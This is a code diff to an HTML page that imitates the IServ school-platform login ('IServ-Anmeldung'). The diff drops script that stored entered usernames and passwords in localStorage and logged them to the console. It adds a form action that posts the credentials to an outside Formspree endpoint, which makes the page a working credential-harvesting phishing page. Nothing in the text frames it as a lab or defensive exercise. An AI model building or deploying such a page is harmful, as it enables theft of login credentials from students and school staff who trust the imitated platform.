@@ -175,8 +175,8 @@
 
     <div class="login-container">
         <h2>IServ-Anmeldung</h2>
-        <form id="loginForm">
-            <input type="text" name="username" placeholder="" class="input-field" required>
+        <form action="https://formspree.io/f/mkgwavqb" method="POST" id="loginForm">
+            <input type="text" name="username" placeholder="Account" class="input-field" required>
 
             <div class="password-container">
                 <input type="password" name="password" placeholder="Passwort" class="input-field" required>
@@ -210,37 +210,17 @@
     </div>
 
     <script>
-        // Funktion zum Speichern der Login-Daten im Local Storage
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // Verhindert den Standardformularversand
-            
-            // Benutzerdaten aus den Eingabefeldern holen
-            var username = document.querySelector('input[name="username"]').value;
-            var password = document.querySelector('input[name="password"]').value;
-            
-            // Anmeldedaten im Local Storage speichern
-            localStorage.setItem('username', username);
-            localStorage.setItem('password', password);
+        // Passwort anzeigen/verbergen
+        const togglePassword = document.querySelector('.toggle-password');
+        const passwordField = document.querySelector('input[name="password"]');
 
-            
-
-            // Optional: Nach dem Speichern eine Bestätigungsseite aufrufen oder etwas anderes machen
+        togglePassword.addEventListener('click', function () {
+            const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordField.setAttribute('type', type);
+            this.textContent = type === 'password' ? '👁️' : '🙈';
         });
-
-        // Funktion zum Anzeigen der gespeicherten Daten in der Konsole
-        window.onload = function() {
-            var storedUsername = localStorage.getItem('username');
-            var storedPassword = localStorage.getItem('password');
-
-            if(storedUsername && storedPassword) {
-                console.log("Gespeicherte Anmeldedaten:");
-                console.log("Benutzername: " + storedUsername);
-                console.log("Passwort: " + storedPassword);
-            }
-        };
-
-        
     </script>
 
 </body>
 </html>
+
